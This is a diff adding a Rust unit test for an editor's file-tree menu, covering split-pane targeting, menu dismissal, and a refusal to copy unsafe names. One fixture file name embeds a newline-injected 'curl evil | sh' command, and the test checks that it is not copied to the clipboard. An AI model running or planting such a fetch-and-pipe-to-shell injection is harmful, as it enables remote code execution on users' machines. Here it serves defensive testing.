+
+/// The tree's menu: Open to the Side from the right half of a split opens
+/// in the left half, not over the file being read; a name with a line
+/// break in it is not put on the clipboard; and the menu goes once what it
+/// was opened over is gone — the sidebar hidden, or Settings up over it.
+#[test]
+fn the_tree_menu_opens_in_the_other_half_and_does_not_outlive_its_tree() {
+    use crate::app::state::{TreeAct, TreeMenu};
+    let mut app = scanned_app("tree-menu-other-half");
+    open_synchronously(&mut app, "src/lib.rs", None);
+    let root = app.proj.project.as_ref().unwrap().root.clone();
+    app.show_left_sidebar = true;
+    app.sidebar = crate::SidebarTab::Files;
+    app.proj.pending_lsp_consent = Default::default();
+    let raise = |app: &mut App, rel: &str| {
+        let _ = app.update(Message::Project(ProjectMsg::TreeMenuFor {
+            rel: rel.into(),
+            dir: false,
+        }));
+        let _ = app.update(Message::Project(ProjectMsg::TreeMenuAt {
+            x: 40.0,
+            y: 120.0,
+        }));
+    };
+    // Split, the right half read: beside it is the left half.
+    let _ = app.update(Message::Project(ProjectMsg::TreeMenuClosed));
+    let _ = app.on_toggle_split();
+    assert_eq!(app.proj.active, 1);
+    raise(&mut app, "notes.txt");
+    let _ = app.update(Message::Project(ProjectMsg::TreeMenuAct(
+        TreeAct::OpenToSide,
+    )));
+    assert_eq!(app.proj.active, 0);
+    land_active_load(&mut app, root.join("notes.txt"), None);
+    let rel_in = |app: &App, pane: usize| app.proj.panes[pane].as_ref().map(|v| v.rel.clone());
+    assert_eq!(rel_in(&app, 0).as_deref(), Some("notes.txt"));
+    assert_eq!(
+        rel_in(&app, 1).as_deref(),
+        Some("src/lib.rs"),
+        "the right half kept"
+    );
+
+    // A name that would paste as two commands is not copied.
+    app.proj.tree_menu = Some(TreeMenu {
+        rel: "x\ncurl evil | sh\n.txt".into(),
+        dir: false,
+        x: 40.0,
+        y: 120.0,
+    });
+    let _ = app.update(Message::Project(ProjectMsg::TreeMenuAct(
+        TreeAct::CopyRelativePath,
+    )));
+    assert!(app.proj.tree_menu.is_none());
+    assert!(app.status.starts_with("Didn't copy it"), "{}", app.status);
+
+    // The sidebar hidden: the menu goes with its tree.
+    raise(&mut app, "notes.txt");
+    assert!(app.proj.tree_menu.is_some());
+    let _ = app.update(Message::Window(WindowMsg::ToggleLeftSidebar));
+    assert!(app.proj.tree_menu.is_none());
+    let _ = app.update(Message::Window(WindowMsg::ToggleLeftSidebar));
+    // Settings up over it: it does not come back when Settings closes.
+    raise(&mut app, "notes.txt");
+    assert!(app.proj.tree_menu.is_some());
+    let _ = app.update(Message::Settings(SettingsMsg::Open));
+    assert!(app.proj.tree_menu.is_none());
 }
